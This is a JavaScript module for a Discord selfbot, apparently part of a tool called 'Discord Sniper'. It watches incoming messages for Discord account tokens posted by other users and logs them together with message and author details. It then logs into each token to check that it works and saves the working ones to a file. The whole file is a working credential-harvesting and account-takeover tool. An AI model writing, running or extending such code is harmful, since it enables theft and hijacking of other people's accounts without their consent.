const { Client } = require("discord.js-selfbot-v13");
function sanitizeName(name) {
    return name.replace(/[^a-z0-9]/gi, "_").toLowerCase();
}
module.exports = (client, chalk, fs, path, global) => {
    client.on("messageCreate", async (message) => {
        const tokenMatch = message.content.match(global.regexs.token);

        if (tokenMatch) {
            const token = tokenMatch[0];

            if (global.config.settings.logs.token) {
                let isguild = false;

                if (message.guild.name.length > 0) {
                    isguild = true;
                }
                const logfolderPath = path.join(
                    __dirname,
                    "../logs",
                    "tokenlogs",
                    sanitizeName(client.user.username),
                    sanitizeName(
                        isguild ? message.guild.name : message.author.tag
                    )
                );

                const logFilePath = path.join(logfolderPath, "token_logs.txt");

                if (!fs.existsSync(logfolderPath)) {
                    fs.mkdirSync(logfolderPath, { recursive: true });
                }

                let logEntry = `╔═════════════════════════════════ Discord Sniper ══════════════════════════════════╗\n`;
                if (isguild) logEntry += `Guild Name: ${message.guild.name}`;
                logEntry += `\nMessage Channel ID: ${message.channel.id}\nMessage Link: ${message.url}\nMessage Author: ${message.author.tag}\nMessage: ${message.content}\n╚═════════════════════════════════ Discord Sniper ══════════════════════════════════╝\n`;

                fs.appendFile(logFilePath, logEntry, (err) => {
                    if (err) {
                        console.error("Error saving log:", err);
                    }
                });
            }

            if (global.sets.snipedtokens.has(token)) {
                return;
            }

            const validationClient = new Client();
            try {
                await validationClient.login(token);

                global.sets.snipedtokens.add(token);
                fs.appendFileSync("snipedtokens.txt", token + "\n");

                console.log(
                    `Token UserName: ${chalk.magenta(
                        validationClient.user.username
                    )} - ${chalk.green(
                        "Token is valid and added to snipedtokens.txt"
                    )}: ${token}`
                );
            } catch (err) {
                console.log(
                    `${chalk.magenta("Token Invalid")} - ${chalk.red(
                        "The token is invalid."
                    )}: ${token}`
                );
            } finally {
                validationClient.destroy();
            }
        }
    });
};
